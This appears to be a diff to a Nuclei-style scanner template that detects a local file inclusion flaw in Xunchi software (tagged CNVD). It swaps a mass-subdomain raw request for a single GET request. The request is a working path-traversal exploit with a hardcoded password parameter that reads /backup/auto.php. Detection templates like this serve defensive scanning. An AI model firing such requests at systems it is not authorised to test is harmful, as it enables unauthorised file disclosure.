@@ -9,15 +9,10 @@ info:
   tags: xunchi,lfi,cnvd
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - "{{BaseURL}}/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php"
 
-    raw:
-      - |
-        GET /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php HTTP/1.1
-        Host: {{Subdomains}}
     matchers-condition: and
     matchers:
       - type: status
